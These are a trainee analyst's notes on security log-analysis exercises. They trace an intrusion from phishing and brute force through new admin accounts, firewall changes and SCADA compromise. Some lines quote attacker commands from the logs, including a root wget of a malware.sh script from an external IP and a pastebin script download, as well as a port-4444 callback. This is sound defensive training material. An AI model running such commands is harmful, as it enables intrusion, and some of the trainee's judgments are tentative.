ANALYSIS: 

1 - 10 
- user alice was compromised by unknown threat actor
- alice clicked on phishing email which urget her to update account info
- threat actor logged into alices account IP=178.45.32.22 and immediately started trying out passwords/password cracking for administrator priviledges 
- after compromising administrator account the threat actor allowed traffic on firewall with port 445 and IP=192.168.10.25
10 - 16
- threat actor created new user with administrator rights and user "tempadmin" to whom he granted access by adding him to administrator group 
- threat actor accessed the CORP-SRV02 through remote access with IP=89.210.45.10
- his action was to allow IP=192.168.10.25 on CORP-SRV02 firewall with destination port 3389
17 - 31 
- new user tempadmin created by threat actor targeted corporate server CORP-SRV02 and user command line to lounch powershell
- threat actor used web proxy server to download http[:]//pastebin[.]com/maliciousscript on corporate server CORP-SRV02 and also executed it as is stated in next log (file="maliciousscript.ps1" action="executed") on corporate server CORP-SRV02 
- useradmin seems to be downloading and running malicious code to persist on internal network 

additional which I missed: 
Windows codes: 
4624 + LogonType=10 → Very likely RDP logon
4625 + many attempts → Strong brute force or spray signal

ANALYSIS: 
4 - 5 
suspicious bad password for admin from same IP without any valid connection after that 
8
http://pastebin[.]com/scr123[.]ps1" - i am not sure what is this so I would look into it and try to find if it is legitimate website
12, 13 - 16, 20 
user admin logon from suspicious IP=172.31.88.22 which I suggest to monitor and after that we have log for svc_sysadmin added to group adminsitrators and firewall log for IP=10.0.2.20:80 which allowed logon from this IP in 20. I would suggest to keep an eye on this behavior since it is suspicious to me and I would rather take it as malicious until proven otherwise than to miss an attack 
24 we have firewall log for allowing IP=172.31.88.22:3389 which I marked as suspicious in previous logs, I would mark this and escalate to L2 ASAP
25 Sysmon of downloaded script with hash
- check has in malicous file databases 
26 anydesk - used for remote desktop is downloaded 
30 possible xss attempt is concerning but i would skip that for now since our systems captured it and there doesn't seem to be any other attack or breach from that IP and we need to focus attention and resources on compromised attacker moving through network 
31 we have endpoint of SCADA-SRV01 scada server 01 executed downloaded malicous script by threat actor from logs: 25 (maliciousscript.ps1) 
35 user account tempadmin is compromised and also tried to reset password
37 -38 we have engineer1 logon - this seems for now as legitimate engineer from company trying to help with incident, his IP is not any of the attackers that they used until now (IP=102.44.88.55) 
40, 45 looks to me like someone from IP address range 203.150.33.30-45 is trying to access priviledged accounts, I would suggest even in this incident scenario blocking those IP range for 1 hour
- contractor1 login_success src_ip=203.150.33.55 - seems like external contractor might have been compromised or their credentials stolen and now we have attacks trying to get into our network I would suggest adding all possible IP range in 203.150.33.1-254 to block for 1 hour 
42
- tempadmin is continuing with attempting to execute unauthorized commands 
- source IP of attacker (IP=172.31.88.22) got priviledges on firewall to access ICS-GW01 on port 502 
47
- port 21 attacker allowed traffic from his external IP=172.31.88.22 to IP=88.102.45.12
48
- scada-logs.rar which might be a disguise or true logs forensic analysis will show in post incident analysis, right now we know attacker provided through his elevated priviledges lateral movement thorugh network and changed firewall policy to be able to exfiltrate data from internal network 

IP addresses 88.102.45.12 & 172.31.88.22 are attacker related and would require immediate attention and blocking 


-------------------------------------------------
Exercise 3.

here’s a log analysis practice exercise with 20 log entries. Your task is to analyze the logs and determine:

If there’s anything suspicious
What kind of event or attack it might be
Whether you would escalate or not

LOGS:

Apr 15 08:46:12 srv1 kernel: Outbound connection to 198.51.100.55 on port 4444 established

CONCLUSION
1330, 1331, 1332, 1333
- root acces from same IP = 203.0.113.45

1335, 1336
- failed password from same IP for “admin” but would need more data to make conclusion so skipping for now

user dave seems to connect through VPN or internal network but his actions are malicious and non-compliant with his normal behavior
( COMMAND=/usr/bin/wget http[:]//198[.]51[.]100[.]55/malware[.]sh)
- with root access

next we have 1339, 1340, 1341 again failed login for root user this time from IP=192.0.2.99

at 08:46:12 we have kernel outbound connection to 198.51.100.55 on port 4444 which us known for malicious purposes

i would conclude that:
user dave was compromised and immediately sent it to L2 Analyst as Critical priority
with correlaction to kernel compromisation in later logs

I would categorize sshd numbers 1330, 1331, 1332, 1333 + 1339, 1340, 1341 + 1343, 1344 as possible brute force attack or at least password cracking from different IPs but within short time frame
in this case I would wait for possible compromise on some of the accounts -> if they behave suspicious
